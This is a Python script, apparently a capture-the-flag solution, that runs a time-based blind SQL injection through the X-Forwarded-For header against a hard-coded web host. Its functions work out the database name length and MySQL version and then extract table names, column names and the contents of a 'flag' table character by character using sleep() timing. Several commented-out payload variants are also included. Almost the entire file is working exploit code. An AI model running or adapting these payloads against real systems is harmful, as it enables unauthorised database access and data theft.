import requests,string
import time

url='http://120.24.86.145:8002/web15/'
allString='0987654321qwertyuiopasdfghjklzxcvbnm'
#print allString

def databaselens():
    for i in range(1,20):
        data_lens="127.0.0.1' and (SELECT(case when (length(database())="+str(i)+") then sleep(5) else sleep(0) end)) and '"
        headers={'X-Forwarded-For':data_lens}
        nowtime=time.time()
        r=requests.get(url,headers=headers)
        endtime=time.time()-nowtime
        if endtime > 4:
            print 'len is :'+str(i)
            break
            return i

def databaseversion():
    for i in range(4,6):
        data_version="127.0.0.1' and (SELECT(case when ((substring(version() from 1 for 1)="+str(i)+")) then sleep(5) else sleep(0) end)) and '"
        #print data_version
        headers = {'X-Forwarded-For': data_version}
        nowtime = time.time()
        r = requests.get(url=url, headers=headers)
        #print r.status_code
        endtime = time.time() - nowtime
        #print endtime
        if endtime > 4:
            print 'mysql version is more than:' + str(i)
            break
            return i

def datatablename():
    tablename=''
    for i in range(1,100):
        #for j in range(43,123):
        for j in allString:
            #data_table="127.0.0.1' and (SELECT(case when ((substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from "+str(i)+" for 1))='"+j+"') then sleep(5) else sleep(0) end)) and '"
            #data_table="127.0.0.1' and (SELECT(case when ((ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from "+str(i)+" for 1)))="+str(j)+") then sleep(5) else sleep(0) end)) and '"
            #data_columns="127.0.0.1' and (SELECT(case when ((ascii(substring((select group_concat(column_name) from information_schema.columns where table_name='flag') from "+str(i)+" for 1)))="+str(j)+") then sleep(5) else sleep(0) end)) and '"
            data_columns="127.0.0.1' and (SELECT(case when ((substring((select group_concat(column_name) from information_schema.columns where table_name='flag') from "+str(i)+" for 1))='"+j+"') then sleep(6) else sleep(0) end)) and '"
            #data_dump="127.0.0.1' and (SELECT(case when ((substring((select flag from flag) FROM "+str(i)+" FOR 1))='"+j+"') then sleep(5) else sleep(0) end)) and '"
            headers = {'X-Forwarded-For': data_columns}
            nowtime = time.time()
            r = requests.get(url=url, headers=headers)
            #print r.status_code
            endtime = time.time() - nowtime
            #print endtime
            if endtime > 6:
                #tablename=tablename+str(j)+' '
                tablename+=j
                print tablename
                break


datatablename()
